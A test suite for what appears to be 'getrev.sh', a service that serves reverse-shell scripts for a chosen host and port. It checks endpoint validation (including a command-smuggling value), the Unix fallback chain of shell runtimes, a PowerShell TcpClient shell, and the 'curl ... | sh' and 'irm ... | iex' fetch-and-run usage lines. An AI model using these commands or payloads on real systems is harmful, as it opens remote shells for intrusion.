import { afterEach, describe, expect, test } from "bun:test";
import { chmodSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createServer, type Socket } from "node:net";
import { spawn, spawnSync } from "node:child_process";
import { parseEndpoint } from "../src/endpoint";
import { handleRequest } from "../src/http";
import { reversePowerShell, reverseShell, unixPayloadCommands } from "../src/payloads";

const temporaryDirectories: string[] = [];

afterEach(() => {
  for (const directory of temporaryDirectories.splice(0)) rmSync(directory, { recursive: true, force: true });
});

function request(path: string, userAgent = "curl/8.0", method = "GET"): Response {
  return handleRequest(new Request(`https://getrev.sh${path}`, { method, headers: { "User-Agent": userAgent } }));
}

describe("endpoint validation", () => {
  test.each([
    ["192.0.2.10:9001", "192.0.2.10", 9001],
    ["operator.example:4444", "operator.example", 4444],
    ["[2001:db8::10]:9001", "2001:db8::10", 9001],
  ])("accepts %s", (address, host, port) => {
    expect(parseEndpoint(address)).toEqual({ host, port });
  });

  test.each([
    "",
    "example.com",
    "example.com:0",
    "example.com:65536",
    "example.com:not-a-port",
    "999.1.1.1:4444",
    "bad host:4444",
    "host;id:4444",
    "-host:4444",
    "host-:4444",
    "host_name:4444",
    "a..b:4444",
    "2001:db8::10:9001",
  ])("rejects %s", (address) => {
    expect(() => parseEndpoint(address)).toThrow();
  });
});

describe("payload generation", () => {
  test("builds the ordered fallback chain", () => {
    const script = reverseShell("operator.example:4444");
    const commands = ["socat", "python3", "python", "ncat", "nc", "perl", "php", "ruby", "node", "bash"];
    let previous = -1;
    for (const command of commands) {
      const position = script.indexOf(`if command -v ${command} >/dev/null`);
      expect(position).toBeGreaterThan(previous);
      previous = position;
    }
    expect(script).toContain("TCP:operator.example:4444");
    expect(script).toContain("&& return 0");
    expect(script).not.toContain("{{");
  });

  test("produces valid POSIX shell", () => {
    expect(spawnSync("sh", ["-n"], { input: reverseShell("192.0.2.10:9001") }).status).toBe(0);
  });

  test("falls back after a failed command", () => {
    const directory = mkdtempSync(join(tmpdir(), "getrev-test-"));
    temporaryDirectories.push(directory);
    for (const [name, body] of [
      ["socat", "#!/bin/sh\nexit 1\n"],
      ["python3", "#!/bin/sh\nprintf 'FALLBACK_OK\\n'\n"],
    ]) {
      const path = join(directory, name);
      writeFileSync(path, body);
      chmodSync(path, 0o755);
    }
    const result = spawnSync("/bin/sh", [], {
      input: reverseShell("127.0.0.1:4444"),
      env: { ...process.env, PATH: directory },
    });
    expect(result.status).toBe(0);
    expect(result.stdout.toString()).toContain("FALLBACK_OK");
  });

  test("returns 127 when no runtime exists", () => {
    const directory = mkdtempSync(join(tmpdir(), "getrev-test-"));
    temporaryDirectories.push(directory);
    const result = spawnSync("/bin/sh", [], {
      input: reverseShell("127.0.0.1:4444"),
      env: { ...process.env, PATH: directory },
    });
    expect(result.status).toBe(127);
    expect(result.stderr.toString()).toContain("no callback succeeded");
  });

  test("keeps PowerShell readable", () => {
    const script = reversePowerShell("operator.example:4444");
    expect(script).toContain("New-Object System.Net.Sockets.TcpClient");
    expect(script).toContain("$client.Connect('operator.example', 4444)");
    expect(script).toContain("[scriptblock]::Create($command)");
    expect(script).not.toContain("EncodedCommand");
  });
});

describe("HTTP handler", () => {
  test("shows safe usage at the root", async () => {
    const body = await request("/").text();
    expect(body).toContain("curl -fsSL https://getrev.sh/10.0.0.5:4444 | sh");
    expect(body).toContain("irm 'https://getrev.sh/10.0.0.5:4444' | iex");
    expect(spawnSync("sh", ["-n"], { input: body }).status).toBe(0);
  });

  test("selects the script from the user agent", async () => {
    expect(await request("/operator.example:4444").text()).toStartWith("#!/bin/sh");
    const windows = await request("/operator.example:4444", "Mozilla/5.0 WindowsPowerShell/5.1").text();
    expect(windows).toContain("System.Net.Sockets.TcpClient");
  });

  test("returns safe errors and strict headers", async () => {
    const result = request("/host;id:4444");
    expect(result.status).toBe(400);
    expect(await result.text()).toStartWith("# getrev.sh:");
    expect(result.headers.get("Cache-Control")).toBe("no-store");
    expect(result.headers.get("X-Content-Type-Options")).toBe("nosniff");
  });

  test("supports HEAD and rejects other methods", async () => {
    const head = request("/example.com:4444", "curl/8.0", "HEAD");
    expect(head.status).toBe(200);
    expect(await head.text()).toBe("");
    const post = request("/example.com:4444", "curl/8.0", "POST");
    expect(post.status).toBe(405);
    expect(post.headers.get("Allow")).toBe("GET, HEAD");
  });

  test("rejects oversized and malformed paths", () => {
    expect(request(`/${"a".repeat(1025)}`).status).toBe(414);
    expect(request("/%E0%A4%A").status).toBe(400);
  });
});

async function callback(
  generate: (port: number) => string,
  executable = "sh",
  prefixArguments: string[] = ["-c"],
): Promise<string> {
  return await new Promise((resolve, reject) => {
    let child: ReturnType<typeof spawn> | undefined;
    let socket: Socket | undefined;
    let settled = false;
    const timer = setTimeout(() => finish(new Error("callback timed out")), 8_000);
    const server = createServer((connection) => {
      socket = connection;
      let output = "";
      connection.setTimeout(4_000, () => finish(new Error("callback response timed out")));
      connection.on("data", (data) => {
        output += data.toString();
        if (output.includes("GETREV_OK")) finish(undefined, output);
      });
      const command = executable === "pwsh" ? "Write-Output 'GETREV_OK'\nexit\n" : "printf 'GETREV_OK\\n'\nexit\n";
      connection.write(command);
    });

    function finish(error?: Error, output = ""): void {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      socket?.destroy();
      server.close();
      child?.kill();
      error ? reject(error) : resolve(output);
    }

    server.once("error", finish);
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      if (!address || typeof address === "string") return finish(new Error("listener has no TCP address"));
      child = spawn(executable, [...prefixArguments, generate(address.port)], {
        env: { ...process.env, PS1: "" },
        stdio: "ignore",
      });
      child.once("error", finish);
      child.once("exit", (status) => {
        if (status && status !== 0) finish(new Error(`${executable} exited with ${status}`));
      });
    });
  });
}

describe.skipIf(!process.env.GETREV_INTEGRATION)("installed payloads", () => {
  const commands = unixPayloadCommands("127.0.0.1:1").map(({ command }) => command);
  for (const command of commands) {
    test(command, async () => {
      if (spawnSync("sh", ["-c", `command -v ${command}`]).status !== 0) return;
      await expect(
        callback((port) => unixPayloadCommands(`127.0.0.1:${port}`).find((payload) => payload.command === command)!.code),
      ).resolves.toContain("GETREV_OK");
    });
  }

  test("powershell", async () => {
    if (spawnSync("pwsh", ["-NoLogo", "-NoProfile", "-Command", "$PSVersionTable.PSVersion"]).status !== 0) return;
    await expect(
      callback((port) => reversePowerShell(`127.0.0.1:${port}`), "pwsh", ["-NoLogo", "-NoProfile", "-NonInteractive", "-Command"]),
    ).resolves.toContain("GETREV_OK");
  });
});
